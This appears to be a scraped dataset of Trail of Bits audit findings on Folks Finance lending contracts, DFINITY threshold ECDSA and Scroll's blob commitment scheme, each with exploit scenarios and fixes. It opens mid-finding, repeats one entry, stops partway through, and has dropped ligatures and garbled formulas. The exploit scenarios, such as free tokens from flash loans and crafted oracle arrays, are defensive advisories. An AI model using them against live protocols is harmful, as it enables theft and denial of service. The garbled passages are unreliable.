Scenario Eve creates a group of six transactions: 1. flash_loan_begin(1000, 5, ..) 2. An asset transfer with an amount of 0 3. flash_loan_end() (which serves only to reset the flash_loan_begin mutex) 4. flash_loan_begin(1000, 5, ..) 5. An asset transfer with an amount of 1000 6. flash_loan_end() Transactions 1 and 4 credit Eve with 2,000 tokens (1,000 tokens per transaction). Transactions 2 and 3 serve only to reset the mutex. Transactions 5 and 6 repay one of the ash loans by transferring 1,000 tokens. Thus, Eve receives 1,000 tokens for free. (Note that for the sake of simplicity, this exploit scenario ignores the fees that would normally be paid.) Recommendations Short term, store the amount to be repaid in flash_loan_key , and ensure that the correct amount is repaid. Long term, create schemas highlighting the relationships between the transactions, and document the invariants related to those relationships.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Lack of a two-step process for admin role transfers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-folksfinance-securityreview.pdf",
        "body": "The Folks Finance methods used to transfer the admin role from one address to another perform those transfers in a single step, immediately updating the admin address. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. These methods include the update_admin method (gure 2.1), which is used to update the address of the pool_manager applications admin. If the update_admin method were called with an incorrect address, it would no longer be possible to execute administrative actions such as the addition of a pool. CODE REDACTED Figure 2.1: REDACTED The update_admin methods of the pool , loan , lp_token_oracle , and oracle_adapter applications also perform admin role transfers in a single step. Exploit Scenario Alice, the admin of the pool_manager application, calls the update_admin method with an incorrect address. As a result, she permanently loses access to the admin role, and new pools cannot be added to the pool_manager application. Recommendations Short term, implement a two-step process for admin role transfers. One way to do this would be splitting each update_admin method into two methods: a propose_admin method that saves the address of the proposed new admin to the global state and an accept_admin method that nalizes the transfer of the role (and must be called by the address of the new admin). Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and help prevent future mistakes. 3. Insu\u0000cient validation of application initialization arguments Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-FOLKS-3 Target: pool_manager.py , pool.py , loan.py , lp_token_oracle.py , oracle_adapter.py",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Ability to reuse swap indexes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-folksfinance-securityreview.pdf",
        "body": "The lack of validation of the swap_collateral_end transaction enables reuse of the same swap_collateral_end transaction for multiple swap operations. Swaps are split into two transactions included in the same group: a swap_collateral_begin transaction (shown in gure 4.1) and a swap_collateral_end transaction (shown in gure 4.2). CODE REDACTED CODE REDACTED Figure 4.1: REDACTED Figure 4.2: REDACTED The swap_collateral_begin method sends the assets to the user executing the swap and checks that there is an associated swap_collateral_end transaction later in the transaction group. The swap_collateral_end method ensures that the loan is overcollateralized: CODE REDACTED Figure 4.3: REDACTED The methods use a mutex to prevent a user from starting a new swap loan before the users previous one is complete. The swap_collateral_begin method uses loan_not_blocked_check to check that the loan is not blocked; swap_collateral_end uses loan_blocked_check to check that the loan is blocked. However, there is no validation of whether the swap_collateral_end transaction at the index passed to swap_collateral_begin is the one that resets the loan block mutex. An attacker could reuse the same swap_collateral_end transaction in multiple calls to swap_collateral_begin , as long as he created additional calls to swap_collateral_end to reset the mutex. We set the severity of this nding to informational because it does not pose a direct threat to the system: despite this issue, a user must execute a call to swap_collateral_end between two calls to swap_collateral_begin , and the related loan must still be overcollateralized. However, the fact that the swap_collateral_begin transaction is not correlated to the swap_collateral_end transaction could lead to additional issues if the code is refactored. (See TOB-FOLKS-1 for details on a similar issue.) Recommendations Short term, consider storing the IDs of blocked operations, and ensure that the swap_collateral_begin and swap_collateral_end transactions are properly correlated with each other. Long term, create schemas highlighting the relationships between the transactions, and document the invariants related to those relationships.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. oracle_adapter could be forced to use outdated LP token information in price calculations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-folksfinance-securityreview.pdf",
        "body": "Because of the insucient validation of encoded byte arrays of compound type arguments, an attacker could force the oracle_adapter application to use outdated information when calculating a liquidity provider (LP) token price. The computation of an LP token price involves two transactions: update_lp_tokens(asset_ids) and refresh_prices(lp_assets, ..) . The update_lp_tokens method updates the supply of the LP token, while refresh_prices computes the LP tokens price. The refresh_prices method calls check_lps_updated , which checks that update_lp_tokens has been called and that the update_lp_tokens.asset_ids array is equal to the update_lp_tokens.lp_asset_ids array. CODE REDACTED Figure 5.1: REDACTED Instead of directly comparing asset_ids to lp_asset_ids , check_lps_updated calls convert_uint64_abi_array_to_uint64_bytes_array to convert the arrays into byte arrays; convert_uint64_abi_array_to_uint64_bytes_array removes the rst two bytes of the array (which indicate the length of the array) and returns the remaining bytes: CODE REDACTED Figure 5.2: REDACTED PyTeal does not provide any guarantees about the structure of compound type arguments. The PyTeal documentation includes the following warning: Figure 5.3: pyteal.readthedocs.io/en/stable/abi.html#registering-methods When data of the uint64 type is converted into a byte array, the bytes length may not match the uint64 values length. If that data is passed to a function that takes a uint64[] parameter, it may be a byte longer than the function expects. Even if the data extracted as the bytes of asset_ids and lp_asset_ids is equivalent, the length of the original arrays might not be. Thus, update_lp_tokens could be called with an lp_asset_ids array that is shorter than the refresh_prices.lp_asset_ids array. In that case, the LP information would not be updated, and the price of the LP token would be based on outdated information. Exploit Scenario Bob holds a position that is eligible for liquidation. However, the AMM pool state changes, causing the price of the LP token that Bob is using as collateral to increase; thus, the loan is safe again, and Bob does not add more collateral. Eve notices that the oracle is still using old information on the LP token. Eve then creates a group of three transactions:  lp_token_oracle.update_lp_tokens(0x0000 + 0xdeadbeefdeadbeef)  oracle_adapter.refresh_prices(0x0001 + 0xdeadbeefdeadbeef, ..)  liquidate(...) The check_lps_updated method veries that lp_token_oracle and oracle_adapter are using the same bytes ( 0xdeadbeefdeadbeef ); however, update_lp_tokens interprets its parameter as an array with a length of zero ( 0x0000 ). As a result, the LP token information is not updated, and the old price is used, enabling Eve to liquidate Bobs position. Recommendations Short term, have the oracle_adapter use the two dynamic arrays ( updated_lp_assets and lp_asset_ids ) directly and extract individual elements to perform an element-wise comparison. Long term, avoid relying on internal structures used by the compiler. Review the PyTeal documentation and test edge cases more broadly.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Incorrect rounding directions in the calculation of borrowed asset amounts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-folksfinance-securityreview.pdf",
        "body": "Multiple incorrect rounding directions are used in the computation of the amount borrowed in a loan. Thus, the result of the calculation may be too low, causing the system to underestimate the amount of assets borrowed in a loan. To determine whether a loan is overcollateralized, is_loan_over_collateralized iterates over an array of all collateral assets and sums the underlying values of those assets: CODE REDACTED Figure 6.1: REDACTED As part of this process, it calls get_stable_borrow_balance and get_var_borrow_balance , both of which call calc_borrow_balance to calculate the borrow balance of the loan at time t : CODE REDACTED Figure 6.2: REDACTED The operation performed by the calc_borrow_balance function is equivalent to that shown in gure 6.3: CODE REDACTED Figure 6.3: REDACTED The function adds 1 to the result of the equation to round it up. However, the 14 * 10      1 portion of the equation rounds down, which can cause the overall rounding error to be greater than 1. Similar issues are present in other functions involved in the computation, including the following:  calc_asset_loan_value , which rounds down the results of its two calls to mul_scale  calc_borrow_interest_index , which rounds down the result of the mul_scale call  exp_by_squaring , which also rounds down the result of the mul_scale call The cumulative loss of precision can cause the system to underestimate the amount of assets borrowed in a loan, preventing the loans liquidation. We set the severity of this issue to low because the loss of precision is limited. However, there may be other rounding issues present in the codebase. Exploit Scenario Eves loan has become undercollateralized. However, because the loan contract rounds down when calculating the amount borrowed in a loan, it does not identify Eves loan as undercollateralized, and the position cannot be liquidated. By contrast, if the contract performed precise accounting, Eves loan would be eligible for liquidation. Recommendations Short term, ensure all arithmetic operations in is_loan_over_collateralized use a conservative rounding directionthat is, ensure that the loss of precision causes the system to interpret a loan as less collateralized than it actually is. Additionally, document those operations. Long term, document the expected rounding direction of every arithmetic operation, and create rounding-specic functions (e.g., mul_scale_down and mul_scale_down_up ) to facilitate reviews of the arithmetic rounding.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "7. Risk of global state variable collision ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-folksfinance-securityreview.pdf",
        "body": "The layout of the loan applications global state could cause a loans params variable to collide with a pool variable. A loan has two types of variables:  params , which is set by the owner and contains the loan parameters  pools , which contains pool information CODE REDACTED DOCUMENTATION REDACTED Figure 7.1: REDACTED Figure 7.2: REDACTED The params variable is stored at oset 112 (Bytes(p)) . The pools variable contains an array in which every slot contains 3 loans, and only slots 062 are assumed to be used for loans. When the pool s slots are used, there is no guarantee that the global state is being accessed through slots 062. This means that slot 112 can be used to store a loan. We set the diculty rating of this issue to high because exploitation of the issue would likely require exploitation of another bug. This is because if slot 112 were used for a loan, its underlying values would likely not be directly usable, particularly because of the following:   The rst element of params is an admin address. The rst element of a loan variable is the pool application ID.  If params collides with a pool variable, its admin address must collide with an application ID. Exploit Scenario Eve nds a lack of validation in the loan ow that allows her to trick the loan application into believing that there is a loan at slot 112. Eve uses the variable collision to change the systems parameters and update the oracle_adapter ID. As a result, the system stops working. Recommendations Short term, store the params variable at the oset (Bytes(params)) . Because loan indexes are uint8 values, using a key with a value greater than 255 will prevent a collision. Long term, create documentation on the management of the global state, and use unit and fuzz testing to check for potential collisions.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Lack of documentation on strategies in case of system parameter update ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-folksfinance-securityreview.pdf",
        "body": "Malicious users of the Folks Finance capital market protocol could try to game the system and earn more than honest users. When users deposit assets into the protocol, they receive interest-bearing assets known as f-assets. To withdraw their original assets, users must return those f-assets. The amount of f-assets provided to a user upon a deposit (as well as the amount of the original asset collected during a withdrawal) depends on the deposit interest index,  .   DOCUMENTATION REDACTED Figure 8.1: REDACTED The value of    slowly increases over time, and certain actions can increase or decrease its rate of increase. For example, when someone borrows assets, the value of will increase    at a faster rate. By contrast, a deposit of additional assets or the repayment of a loan will cause to increase at a slower rate.    Active lenders with knowledge of this behavior can prioritize strategies that will maximize their prots, giving them an advantage over passive lenders. It is possible that updates to the systems parameters could also aect the way that the value of changes; however, determining whether that is the case would require further    investigation. Exploit Scenario Eve learns that Bob is going to borrow assets worth USD 10 million. Eve provides liquidity just before the execution of Bobs transaction and withdraws it right after. In this way, she earns fees from the protocol without participating in the protocol. Recommendations Short term, document the expected behavior of lenders and borrowers, and consider implementing a deposit lockup period. Long term, model and document the strategies that users are expected to leverage. Additionally, evaluate the impact of system parameter updates on the protocol. References   https://uniswap.org/blog/jit-liquidity https://medium.com/@peter_4205/curve-vulnerability-report-a1d7630140ec",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Incorrect decoding of method arguments results in the use of invalid values ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-folksfinance-securityreview.pdf",
        "body": "Certain methods use the Btoi instruction to decode the arguments of the other transactions in their group, resulting in the use of incorrect values. Most of the protocol operations involve a group of multiple transactions. In some cases, one method uses or validates the other transactions in the group and must decode their arguments. One such method is loan.add_pool (gure 9.1), which uses an argument of a pool application transaction. CODE REDACTED Figure 9.1: REDACTED The add_pool method decodes the rst argument of the pool.add_loan_application method, which is an index argument of type uint8 . The pool application decodes this argument by using the get_byte operation to extract the rst byte of the argument. However, add_pool decodes the argument by using the Btoi instruction, which is not the equivalent of extracting the rst byte. Specically, Btoi(0x00..0X) would return X , and get_byte(0, 0x00..0X) would return 0 . This results in the use of dierent values in the two methods and causes the system to enter an invalid state. This issue also aects loan.swap_collateral_begin (gure 9.2), which decodes an argument of loan.swap_collateral_end for validation. CODE REDACTED Figure 9.2: REDACTED The swap_collateral_begin method also uses Btoi for decoding, while correctly decoding the argument would require extraction of the rst byte. However, the issue has a limited impact on the collateral swap operation: a value of 0x00..0X would cause swap_collateral_end to use the account at index 0 of the transactions accounts array, which cannot be a valid escrow account. Exploit Scenario Alice, the admin of the loan application, creates a group of two transactions: 1. pool.add_loan_application(0x0000000000000001, ...) 2 . loan.add_pool(...) The loan application decodes the add_loan_application methods index as 1, whereas the pool application uses 0 as the index. The discrepancy causes the system to enter an invalid state. Recommendations Short term, use the compiler-provided decode() method ( from the abi.{type} object) to decode application arguments. Long term, avoid relying on compiler internals. Review the PyTeal documentation and test edge cases more broadly.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Lack of minimum / maximum bounds on user operation parameters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-folksfinance-securityreview.pdf",
        "body": "The outcomes of several pool and loan operations are dependent on the system state. This means that users have no on-chain guarantees that their transactions will produce the outcomes they expect. Examples of this issue include the following:    The caller of pool.deposit may receive less f-assets than expected (e.g., zero f-assets in exchange for a small deposit). If the amount value passed to pool.withdraw is variable, the user may receive less assets than expected. An update to the retention rate would aect the outcomes of all loan operations that use the retention rate. Note that loan.borrow and loan.switch_borrow_type do ha ve a max_stable_rate parameter. Exploit Scenario Bob calls pool.deposit with a small amount of assets but does not receive any f-assets in return. Recommendations Short term, add minimum and maximum bounds on the parameters of all user operations. Long term, document the front-running risks associated with each operation, and ensure that there are proper mitigations in place for those risks.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Lack of validation of signed dealing against original dealing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYThresholdECDSAandBtcCanisters.pdf",
        "body": "The EcdsaPreSignerImpl::validate_dealing_support method does not check that the content of signed dealings matches the original dealings. A malicious receiver could exploit this lack of validation by changing the requested height (that is, the support.content.requested_height eld) or internal data (the support.content.idk_dealing.internal_dealing_raw eld) before signing the ECDSA dealing. The resulting signature would not be agged as invalid by the validate_dealing_support method but would result in an invalid aggregated signature. After all nodes sign a dealing, the EcdsaTranscriptBuilderImpl::build_transcript method checks the signed dealings content hashes before attempting to aggregate all the dealing support signatures to produce the nal aggregated signature. The method logs a warning when the hashes do not agree, but does not otherwise act on signed dealings with dierent content. let mut content_hash = BTreeSet::new(); for share in &support_shares { content_hash.insert(ic_crypto::crypto_hash(&share.content)); } if content_hash.len() > 1 { warn!( self.log, \"Unexpected multi share content: support_shares = {}, content_hash = {}\", support_shares.len(), content_hash.len() ); self.metrics.payload_errors_inc(\"invalid_content_hash\"); } if let Some(multi_sig) = self.crypto_aggregate_dealing_support( transcript_state.transcript_params, &support_shares, ) { } transcript_state.add_completed_dealing(signed_dealing.content, multi_sig); Figure 1.1: ic/rs/consensus/src/ecdsa/pre_signer.rs:1015-1034 The dealing content is added to the set of completed dealings along with the aggregated signature. When the node attempts to create a new transcript from the dealing, the aggregated signature is checked by IDkgProtocol::create_transcript. If a malicious receiver changes the content of a dealing before signing it, the resulting invalid aggregated signature would be rejected by this method. In such a case, the EcdsaTranscriptBuilderImpl methods build_transcript and get_completed_transcript would return None for the corresponding transcript ID. That is, neither the transcript nor the corresponding quadruple would be completed. Additionally, since signing requests are deterministically matched against quadruples, including quadruples that are not yet available, this issue could allow a single node to block the service of individual signing requests. pub(crate) fn get_signing_requests<'a>( ecdsa_payload: &ecdsa::EcdsaPayload, sign_with_ecdsa_contexts: &'a BTreeMap<CallbackId, SignWithEcdsaContext>, ) -> BTreeMap<ecdsa::RequestId, &'a SignWithEcdsaContext> { let known_random_ids: BTreeSet<[u8; 32]> = ecdsa_payload .iter_request_ids() .map(|id| id.pseudo_random_id) .collect::<BTreeSet<_>>(); let mut unassigned_quadruple_ids = ecdsa_payload.unassigned_quadruple_ids().collect::<Vec<_>>(); // sort in reverse order (bigger to smaller). unassigned_quadruple_ids.sort_by(|a, b| b.cmp(a)); let mut new_requests = BTreeMap::new(); // The following iteration goes through contexts in the order // of their keys, which is the callback_id. Therefore we are // traversing the requests in the order they were created. for context in sign_with_ecdsa_contexts.values() { if known_random_ids.contains(context.pseudo_random_id.as_slice()) { continue; }; if let Some(quadruple_id) = unassigned_quadruple_ids.pop() { let request_id = ecdsa::RequestId { quadruple_id, pseudo_random_id: context.pseudo_random_id, }; new_requests.insert(request_id, context); } else { break; } } new_requests } Figure 1.2: ic/rs/consensus/src/ecdsa/payload_builder.rs:752-782 Exploit Scenario A malicious node wants to prevent the signing request SRi from completing. Assume that the corresponding quadruple, Qi, is not yet available. The node waits until it receives a dealing corresponding to quadruple Qi. It generates a support message for the dealing, but before signing the dealing, the malicious node changes the dealing.idk_dealing.internal_dealing_raw eld. The signature is valid for the updated dealing but not for the original dealing. The malicious dealing support is gossiped to the other nodes in the network. Since the signature on the dealing support is correct, all nodes move the dealing support to the validated pool. However, when the dealing support signatures are aggregated by the other nodes, the aggregated signature is rejected as invalid, and no new transcript is created for the dealing. This means that the quadruple Qi never completes. Since the matching of signing requests to quadruples is deterministic, SRi is matched with Qi every time a new ECDSA payload is created. Thus, SRi is never serviced. Recommendations Short term, add validation code in EcdsaPreSignerImpl::validate_dealing_support to verify that a signed dealings content hash is identical to the hash of the original dealing. Long term, consider whether the BLS multisignature aggregation APIs need to be better documented to ensure that API consumers verify that all individual signatures are over the same message.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. The ECDSA payload is not updated if a quadruple fails to complete ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYThresholdECDSAandBtcCanisters.pdf",
        "body": "If a transcript fails to complete (as described in TOB-DFTECDSA-1), the corresponding quadruple, Qi, will also fail to complete. This means that the quadruple ID for Qi will remain in the quadruples_in_creation set until the key is reshared and the set is purged. (Currently, the key is reshared if a node joins or leaves the subnet, which is an uncommon occurrence.) Moreover, if a transcript and the corresponding Qi fail to complete, so will the corresponding signing request, SRi, as it is matched deterministically with Qi. let ecdsa_payload = ecdsa::EcdsaPayload { signature_agreements: ecdsa_payload.signature_agreements.clone(), ongoing_signatures: ecdsa_payload.ongoing_signatures.clone(), available_quadruples: if is_new_key_transcript { BTreeMap::new() } else { ecdsa_payload.available_quadruples.clone() }, quadruples_in_creation: if is_new_key_transcript { BTreeMap::new() } else { ecdsa_payload.quadruples_in_creation.clone() }, uid_generator: ecdsa_payload.uid_generator.clone(), idkg_transcripts: BTreeMap::new(), ongoing_xnet_reshares: if is_new_key_transcript { // This will clear the current ongoing reshares, and // the execution requests will be restarted with the // new key and different transcript IDs. BTreeMap::new() } else { ecdsa_payload.ongoing_xnet_reshares.clone() }, xnet_reshare_agreements: ecdsa_payload.xnet_reshare_agreements.clone(), }; Figure 2.1: The quadruples_in_creation set will be purged only when the key is reshared. The canister will never be notied that the signing request failed and will be left waiting indenitely for the corresponding reply from the distributed signing service. Recommendations Short term, revise the code so that if a transcript (permanently) fails to complete, the quadruple ID and corresponding transcripts are dropped from the ECDSA payload. To ensure that a malicious node cannot inuence how signing requests are matched with quadruples, revise the code so that it noties the canister that the signing request failed.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Malicious canisters can exhaust the number of available quadruples ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYThresholdECDSAandBtcCanisters.pdf",
        "body": "By requesting a large number of signatures, a canister (or set of canisters) could exhaust the number of available quadruples, preventing other signature requests from completing in a timely manner. The ECDSA payload builder defaults to creating one extra quadruple in create_data_payload if there is no ECDSA conguration for the subnet in the registry. let ecdsa_config = registry_client .get_ecdsa_config(subnet_id, summary_registry_version)? .unwrap_or(EcdsaConfig { quadruples_to_create_in_advance: 1, // default value ..EcdsaConfig::default() }); Figure 3.1: ic/rs/consensus/src/ecdsa/payload_builder.rs:400-405 Signing requests are serviced by the system in the order in which they are made (as determined by their CallbackID values). If a canister (or set of canisters) makes a large number of signing requests, the system would be overwhelmed and would take a long time to recover. This issue is partly mitigated by the fee that is charged for signing requests. However, we believe that the nancial ramications of this problem could outweigh the fees paid by attackers. For example, the type of denial-of-service attack described in this nding could be devastating for a DeFi application that is sensitive to small price uctuations in the Bitcoin market. Since the ECDSA threshold signature service is not yet deployed on the Internet Computer, it is unclear how the service will be used in practice, making the severity of this issue dicult to determine. Therefore, the severity of this issue is marked as undetermined. Exploit Scenario A malicious canister learns that another canister on the Internet Computer is about to request a time-sensitive signature on a message. The malicious canister immediately requests a large number of signatures from the signing service, exhausting the number of available quadruples and preventing the original signature from completing in a timely manner. Recommendations One possible mitigation is to increase the number of quadruples that the system creates in advance, making it more expensive for an attacker to carry out a denial-of-service attack on the ECDSA signing service. Another possibility is to run multiple signing services on multiple subnets of the Internet Computer. This would have the added benet of protecting the system from resource exhaustion related to cross-network bandwidth limitations. However, both of these solutions scale only linearly with the number of added quadruples/subnets. Another potential mitigation is to introduce a dynamic fee or stake based on the number of outstanding signing requests. In the case of a dynamic fee, the canister would pay a set number of tokens proportional to the number of outstanding signing requests whenever it requests a new signature from the service. In the case of a stake-based system, the canister would stake funds proportional to the number of outstanding requests but would recover those funds once the signing request completed. As any signing service that depends on consensus will have limited throughput compared to a centralized service, this issue is dicult to mitigate completely. However, it is important that canister developers are aware of the limits of the implementation. Therefore, regardless of the mitigations imposed, we recommend that the DFINITY team clearly document the limits of the current implementation.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Aggregated signatures are dropped if their request IDs are not recognized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYThresholdECDSAandBtcCanisters.pdf",
        "body": "The update_signature_agreements function populates the set of completed signatures in the ECDSA payload. The function aggregates the completed signatures from the ECDSA pool by calling EcdsaSignatureBuilderImpl::get_completed_signatures. However, if a signatures associated signing request ID is not in the set of ongoing signatures, update_signature_agreements simply drops the signature. for (request_id, signature) in builder.get_completed_signatures( chain, ecdsa_pool.deref() ) { if payload.ongoing_signatures.remove(&request_id).is_none() { warn!( log, \"ECDSA signing request {:?} is not found in payload but we have a signature for it\", request_id ); } else { payload .signature_agreements .insert(request_id, ecdsa::CompletedSignature::Unreported(signature)); } } Figure 4.1: ic/rs/consensus/src/ecdsa/payload_builder.rs:817-830 Barring an implementation error, this should not happen under normal circumstances. Recommendations Short term, consider adding the signature to the set of completed signatures on the next ECDSA payload. This will ensure that all outstanding signing requests are completed. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "6. The blob-based public input commitment scheme is poorly documented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "To reduce the gas cost of verication, the Scroll team has moved some of the ZkEVMs public input data into the EIP-4844 blob structure, whereby the underlying data is stored only temporarily, at a lower gas cost. The verier contract has access only to a polynomial commitment to the blob data and evaluation proofs. Additionally, with the addition of the zstd circuits reviewed in this report, the data in the blob is instead in zstd-compressed form. When the ZkEVM verier is deployed in the Scroll rollup contract, a batch, consisting of both L1 and L2 transactions and associated metadata, is committed in the rollup contract. Committed batches can then either be reverted or nalized. To nalize a batch, a ZkEVM proof is checked against the metadata provided in the commit stage, and if the proof succeeds, the batch is nalized and can no longer be reverted. Since the ZkEVM prover should be untrusted in the system, the metadata in the commit stage must uniquely identify the transactions in the underlying batch; otherwise, the prover may be able to nalize a dierent sequence of transactions than was intended. Prior to EIP-4844 integration, the sequence of transactions in a chunk was fully determined by the public input hash of the ZkEVM circuit, which would then be combined together into an overall public input hash by the aggregation circuit. In this scheme, the unique identication is a straightforward consequence of the collision resistance of the hash used. However, the current scheme is more complex. The transactions are now split between this public input hash and the blob structure. The PI subcircuit of the ZkEVM splits the underlying sequence of transactions into L1 and L2 transactions. The L1 transactions are included in the public input hash, and the L2 transactions are included in the chunk tx hash. Unless there is some as-yet-unknown aw in the PI subcircuit, this guarantees the uniqueness of the L1 transactions as before. To commit to the L2 transactions, the overall public inputs of the aggregation circuit include a tuple (versionedHash,z,y) , representing the polynomial commitment to the blob and the evaluation that must be checked by the verier. To conclude that this uniquely identies a particular sequence of L2 transactions, we must determine that: is a unique polynomial corresponding to versionedHash ; is a unique polynomial corresponding to the L2 transaction 1. 2. 3.  (  )  (  ) , where , where  (  ) =   (  ) =  sequence;  both the L2 transaction sequence and versionedHash . is a pseudorandom challenge derived from a transcript including commitments to These three requirements suce because blobs represent degree-4096 polynomials over a 254-bit nite eld. The chance that point purpose of checking that for a randomly sampled as randomly sampled for the is negligible, and requirement (3) allows us to treat by the Fiat-Shamir heuristic.  (  ) =  (  )  (  )   (  )  (  ) =  (  ) and   Requirement (1) is ensured because the verier contract checks a point evaluation proof, and versionedHash is a hash of a KZG commitment, which uniquely determines  (  ) .  (  ) is more complicated, since the underlying The evaluation in requirement (2) is checked by the BarycentricEvaluationConfig circuit. However, the uniqueness of transaction data is not stored in the blob. Instead, the BatchDataConfig subcircuit of the aggregation circuit includes the whole L2 transaction sequence data as private witness values. The aggregation circuit checks those hashes against the chunk tx hash public inputs of the ZkEVM proofs being aggregated, and checks that the L2 transaction sequence is the result of zstd-decompressing the data used in the BarycentricEvaluationConfig circuit. To then establish that circuit is deterministic; and (b) that the serialization of the L2 transactions when computing the chunk tx hash is unique. is unique, we must assume (a) that the zstd decompression  (  ) Finally, requirement (3) is ensured by checking that the challenge can be computed as a hash of data that includes the versionedHash and the chunk tx hashes, via an internal lookup in the BatchDataConfig table, shown below in gure 6.1. // lookup challenge digest in keccak table. meta.lookup_any( \"BatchDataConfig (metadata/chunk_data/challenge digests in keccak table)\" , |meta| { let is_hash = meta.query_selector(config.hash_selector); let is_boundary = meta.query_advice(config.is_boundary, Rotation::cur()); // when is_boundary is set in the \"digest RLC\" section. // this is also the last row of the \"digest RLC\" section. let cond = is_hash * is_boundary; // - metadata_digest: 32 bytes // - chunk[i].chunk_data_digest: 32 bytes each // - versioned_hash: 32 bytes let preimage_len = 32. expr() * (N_SNARKS + 1 + 1 ).expr(); [ 1. expr(), 1. expr(), meta.query_advice(config.preimage_rlc, Rotation::cur()), // input rlc // input len preimage_len, // output rlc meta.query_advice(config.digest_rlc, Rotation::cur()), // q_enable // is final ] .into_iter() .zip_eq(keccak_table.table_exprs(meta)) .map(|(value, table)| (cond.expr() * value, table)) .collect() }, ); Figure 6.1: Lookups from the chunk_data section of the table to the challenge section of the table ( zkevm-circuits/aggregator/src/aggregation/batch_data.rs#334362 ) All of these properties appear to hold; however, they are neither explicitly stated nor explicitly justied in Scrolls documentation. If any of them fails, it would allow a malicious prover to nalize a dierent batch of transactions than was committed, causing many potential issues such as denial of service or state divergence. Recommendations Short term, document this commitment scheme and specify what properties of dierent components it relies upon (e.g., deterministic decompression). Long term, explicitly document all intended security properties of the Scroll rollup, and what is required of each system component to ensure those properties.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "6. The blob-based public input commitment scheme is poorly documented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "To reduce the gas cost of verication, the Scroll team has moved some of the ZkEVMs public input data into the EIP-4844 blob structure, whereby the underlying data is stored only temporarily, at a lower gas cost. The verier contract has access only to a polynomial commitment to the blob data and evaluation proofs. Additionally, with the addition of the zstd circuits reviewed in this report, the data in the blob is instead in zstd-compressed form. When the ZkEVM verier is deployed in the Scroll rollup contract, a batch, consisting of both L1 and L2 transactions and associated metadata, is committed in the rollup contract. Committed batches can then either be reverted or nalized. To nalize a batch, a ZkEVM proof is checked against the metadata provided in the commit stage, and if the proof succeeds, the batch is nalized and can no longer be reverted. Since the ZkEVM prover should be untrusted in the system, the metadata in the commit stage must uniquely identify the transactions in the underlying batch; otherwise, the prover may be able to nalize a dierent sequence of transactions than was intended. Prior to EIP-4844 integration, the sequence of transactions in a chunk was fully determined by the public input hash of the ZkEVM circuit, which would then be combined together into an overall public input hash by the aggregation circuit. In this scheme, the unique identication is a straightforward consequence of the collision resistance of the hash used. However, the current scheme is more complex. The transactions are now split between this public input hash and the blob structure. The PI subcircuit of the ZkEVM splits the underlying sequence of transactions into L1 and L2 transactions. The L1 transactions are included in the public input hash, and the L2 transactions are included in the chunk tx hash. Unless there is some as-yet-unknown aw in the PI subcircuit, this guarantees the uniqueness of the L1 transactions as before. To commit to the L2 transactions, the overall public inputs of the aggregation circuit include a tuple (versionedHash,z,y) , representing the polynomial commitment to the blob and the evaluation that must be checked by the verier. To conclude that this uniquely identies a particular sequence of L2 transactions, we must determine that: is a unique polynomial corresponding to versionedHash ; is a unique polynomial corresponding to the L2 transaction 1. 2. 3.  (  )  (  ) , where , where  (  ) =   (  ) =  sequence;  both the L2 transaction sequence and versionedHash . is a pseudorandom challenge derived from a transcript including commitments to These three requirements suce because blobs represent degree-4096 polynomials over a 254-bit nite eld. The chance that point purpose of checking that for a randomly sampled as randomly sampled for the is negligible, and requirement (3) allows us to treat by the Fiat-Shamir heuristic.  (  ) =  (  )  (  )   (  )  (  ) =  (  ) and   Requirement (1) is ensured because the verier contract checks a point evaluation proof, and versionedHash is a hash of a KZG commitment, which uniquely determines  (  ) .  (  ) is more complicated, since the underlying The evaluation in requirement (2) is checked by the BarycentricEvaluationConfig circuit. However, the uniqueness of transaction data is not stored in the blob. Instead, the BatchDataConfig subcircuit of the aggregation 